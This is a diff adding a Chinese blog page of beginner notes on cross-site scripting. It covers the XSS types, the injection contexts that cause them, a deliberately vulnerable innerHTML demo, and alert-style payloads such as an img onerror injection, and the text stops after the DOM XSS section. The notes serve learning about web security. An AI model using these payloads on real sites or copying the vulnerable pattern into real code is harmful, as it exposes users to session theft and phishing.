@@ -1,0 +1,824 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>XSS - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="XSS" />
+<meta property="og:description" content="XSS基础初学笔记" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/xss/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-12-17T15:38:11+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="XSS"/>
+<meta name="twitter:description" content="XSS基础初学笔记"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/xss/" /><link rel="prev" href="http://scofield1920.github.io/xss-csrf_combination/" /><link rel="next" href="http://scofield1920.github.io/wireshark_capture_qq_ip/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "XSS",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/xss\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "notes","wordcount":  358 ,
+        "url": "http:\/\/scofield1920.github.io\/xss\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-12-17T15:38:11+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x1-简介">0x1 简介</a></li>
+    <li><a href="#0x2-跨站脚本实例">0x2 跨站脚本实例</a></li>
+    <li><a href="#0x3-分类">0x3 分类</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1反射型xss非持久型">(1)反射型XSS（非持久型）</a>
+              <ul>
+                <li><a href="#漏洞成因">漏洞成因</a></li>
+                <li><a href="#攻击流程">攻击流程</a></li>
+              </ul>
+            </li>
+            <li><a href="#2存储型xss持久型">(2)存储型XSS（持久型）</a>
+              <ul>
+                <li><a href="#漏洞成因-1">漏洞成因</a></li>
+                <li><a href="#攻击流程-1">攻击流程</a></li>
+              </ul>
+            </li>
+            <li><a href="#3dom型xss">(3)DOM型XSS</a>
+              <ul>
+                <li><a href="#漏洞成因-2">漏洞成因</a></li>
+              </ul>
+            </li>
+            <li><a href="#4通用型xss">(4)通用型XSS</a>
+              <ul>
+                <li><a href="#漏洞成因-3">漏洞成因</a></li>
+                <li><a href="#漏洞案例">漏洞案例</a></li>
+              </ul>
+            </li>
+            <li><a href="#5突变型xss">(5)突变型XSS</a>
+              <ul>
+                <li><a href="#漏洞成因-4">漏洞成因</a></li>
+                <li><a href="#攻击流程-2">攻击流程</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#0x4-利用流程">0x4 利用流程</a></li>
+    <li><a href="#0x5-难度">0x5 难度</a></li>
+    <li><a href="#0x6-防御">0x6 防御</a></li>
+    <li><a href="#0x7自动化xss">0x7自动化XSS</a>
+      <ul>
+        <li><a href="#beef简介">BeEF简介</a>
+          <ul>
+            <li><a href="#信息收集"><strong>信息收集</strong>：</a></li>
+            <li><a href="#持久化控制"><strong>持久化控制</strong>:</a></li>
+            <li><a href="#社会工程"><strong>社会工程</strong>：</a></li>
+            <li><a href="#渗透攻击"><strong>渗透攻击</strong>：</a></li>
+          </ul>
+        </li>
+        <li><a href="#beef基础">BeEF基础</a></li>
+        <li><a href="#信息收集-1">信息收集</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">XSS</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>notes</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-12-17">2023-12-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;358 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x1-简介">0x1 简介</a></li>
+    <li><a href="#0x2-跨站脚本实例">0x2 跨站脚本实例</a></li>
+    <li><a href="#0x3-分类">0x3 分类</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1反射型xss非持久型">(1)反射型XSS（非持久型）</a>
+              <ul>
+                <li><a href="#漏洞成因">漏洞成因</a></li>
+                <li><a href="#攻击流程">攻击流程</a></li>
+              </ul>
+            </li>
+            <li><a href="#2存储型xss持久型">(2)存储型XSS（持久型）</a>
+              <ul>
+                <li><a href="#漏洞成因-1">漏洞成因</a></li>
+                <li><a href="#攻击流程-1">攻击流程</a></li>
+              </ul>
+            </li>
+            <li><a href="#3dom型xss">(3)DOM型XSS</a>
+              <ul>
+                <li><a href="#漏洞成因-2">漏洞成因</a></li>
+              </ul>
+            </li>
+            <li><a href="#4通用型xss">(4)通用型XSS</a>
+              <ul>
+                <li><a href="#漏洞成因-3">漏洞成因</a></li>
+                <li><a href="#漏洞案例">漏洞案例</a></li>
+              </ul>
+            </li>
+            <li><a href="#5突变型xss">(5)突变型XSS</a>
+              <ul>
+                <li><a href="#漏洞成因-4">漏洞成因</a></li>
+                <li><a href="#攻击流程-2">攻击流程</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#0x4-利用流程">0x4 利用流程</a></li>
+    <li><a href="#0x5-难度">0x5 难度</a></li>
+    <li><a href="#0x6-防御">0x6 防御</a></li>
+    <li><a href="#0x7自动化xss">0x7自动化XSS</a>
+      <ul>
+        <li><a href="#beef简介">BeEF简介</a>
+          <ul>
+            <li><a href="#信息收集"><strong>信息收集</strong>：</a></li>
+            <li><a href="#持久化控制"><strong>持久化控制</strong>:</a></li>
+            <li><a href="#社会工程"><strong>社会工程</strong>：</a></li>
+            <li><a href="#渗透攻击"><strong>渗透攻击</strong>：</a></li>
+          </ul>
+        </li>
+        <li><a href="#beef基础">BeEF基础</a></li>
+        <li><a href="#信息收集-1">信息收集</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>XSS基础初学笔记</p>
+<h2 id="0x1-简介" class="headerLink">
+    <a href="#0x1-%e7%ae%80%e4%bb%8b" class="header-mark"></a>0x1 简介</h2><p><strong>跨站脚本</strong>（cross site script）为了避免与样式css混淆，所以简称为XSS,是web中最主流的攻击方式。
+XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。</p>
+<p>XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p>
+<p><strong>XSS漏洞普遍流行的原因:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的
+</span></span><span class="line"><span class="cl">输入与输出的 Web 应用程序基本交互防护不够
+</span></span><span class="line"><span class="cl">程序员缺乏安全意识，缺少对 XSS 漏洞的认知
+</span></span><span class="line"><span class="cl">XSS 触发简单，完全防御起来相当困难 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>XSS攻击的危害:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">网络钓鱼
+</span></span><span class="line"><span class="cl">盗取用户 cookies 信息
+</span></span><span class="line"><span class="cl">劫持用户浏览器
+</span></span><span class="line"><span class="cl">强制弹出广告页面、刷流量
+</span></span><span class="line"><span class="cl">网页挂马
+</span></span><span class="line"><span class="cl">进行恶意操作，例如任意篡改页面信息
+</span></span><span class="line"><span class="cl">获取客户端隐私信息
+</span></span><span class="line"><span class="cl">控制受害者机器向其他网站发起攻击
+</span></span><span class="line"><span class="cl">结合其他漏洞，如 CSRF 漏洞，实施进一步作恶
+</span></span><span class="line"><span class="cl">提升用户权限，包括进一步渗透网站
+</span></span><span class="line"><span class="cl">传播跨站脚本蠕虫等
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x2-跨站脚本实例" class="headerLink">
+    <a href="#0x2-%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e5%ae%9e%e4%be%8b" class="header-mark"></a>0x2 跨站脚本实例</h2><p>下面的 HTML 代码就演示了一个最基本的 XSS 弹窗：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;script&gt;alert(1)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x3-分类" class="headerLink">
+    <a href="#0x3-%e5%88%86%e7%b1%bb" class="header-mark"></a>0x3 分类</h2><h4 id="1反射型xss非持久型" class="headerLink">
+    <a href="#1%e5%8f%8d%e5%b0%84%e5%9e%8bxss%e9%9d%9e%e6%8c%81%e4%b9%85%e5%9e%8b" class="header-mark"></a>(1)反射型XSS（非持久型）</h4><p>反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。</p>
+<h5 id="漏洞成因" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" class="header-mark"></a>漏洞成因</h5><p>当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">将不可信数据插入到</span><span class="n">HTML标签之间时</span><span class="err">；</span><span class="o">//</span> <span class="err">例如</span><span class="n">div</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">td</span><span class="err">；</span>
+</span></span><span class="line"><span class="cl"><span class="err">将不可信数据插入到</span><span class="n">HTML属性里时</span><span class="err">；</span><span class="o">//</span> <span class="err">例如：</span><span class="o">&lt;</span><span class="n">div</span> <span class="n">width</span><span class="o">=$</span><span class="n">INPUT</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">将不可信数据插入到</span><span class="n">SCRIPT里时</span><span class="err">；</span><span class="o">//</span> <span class="err">例如：</span><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="k">var</span> <span class="n">message</span> <span class="o">=</span> <span class="err">”</span> <span class="o">$</span><span class="n">INPUT</span> <span class="err">“</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">还有插入到</span><span class="n">Style属性里的情况</span><span class="err">，同样具有一定的危害性；</span><span class="o">//</span> <span class="err">例如</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">”</span> <span class="n">property</span> <span class="p">:</span> <span class="o">$</span><span class="n">INPUT</span> <span class="err">”</span><span class="o">&gt;&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">将不可信数据插入到</span><span class="n">HTML</span> <span class="n">URL里时</span><span class="err">，</span><span class="o">//</span> <span class="err">例如：</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="err">”</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">abcd</span><span class="o">.</span><span class="n">com</span><span class="err">?</span><span class="n">param</span><span class="o">=</span><span class="p">](</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">ccc</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="err">?</span><span class="n">param</span><span class="o">=</span><span class="p">)</span> <span class="o">$</span><span class="n">INPUT</span> <span class="err">”</span><span class="o">&gt;&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">使用富文本时，没有使用</span><span class="n">XSS规则引擎进行编码过滤</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="攻击流程" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b" class="header-mark"></a>攻击流程</h5><p>反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png" title="image-20230511010637671" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png 2x"
+            sizes="auto"
+            alt="image-20230511010637671">
+    </a></figure></p>
+<h4 id="2存储型xss持久型" class="headerLink">
+    <a href="#2%e5%ad%98%e5%82%a8%e5%9e%8bxss%e6%8c%81%e4%b9%85%e5%9e%8b" class="header-mark"></a>(2)存储型XSS（持久型）</h4><h5 id="漏洞成因-1" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0-1" class="header-mark"></a>漏洞成因</h5><p>存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。</p>
+<h5 id="攻击流程-1" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b-1" class="header-mark"></a>攻击流程</h5><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png" title="image-20230511010807248" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png 2x"
+            sizes="auto"
+            alt="image-20230511010807248">
+    </a></figure></p>
+<h4 id="3dom型xss" class="headerLink">
+    <a href="#3dom%e5%9e%8bxss" class="header-mark"></a>(3)DOM型XSS</h4><p>输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。</p>
+<h5 id="漏洞成因-2" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0-2" class="header-mark"></a>漏洞成因</h5><p>DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。
+下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">xss</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nb">str</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s2">&#34;demo&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&lt;img src=&#39;&#34;</span><span class="o">+</span><span class="nb">str</span><span class="o">+</span><span class="s2">&#34;&#39; /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;src&#34;</span> <span class="n">size</span><span class="o">=</span><span class="s2">&#34;50&#34;</span> <span class="n">placeholder</span><span class="o">=</span><span class="s2">&#34;输入图片地址&#34;</span> <span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&#34;插入&#34;</span> <span class="n">onclick</span><span class="o">=</span><span class="s2">&#34;xss()&#34;</span> <span class="o">/&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;demo&#34;</span> <span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上：</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png" title="image-20230511011033557" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png 2x"
+            sizes="auto"
+            alt="image-20230511011033557">
+    </a></figure></p>
+<p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;img src=&#34;1&#34; onerror=&#34;alert(1)&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
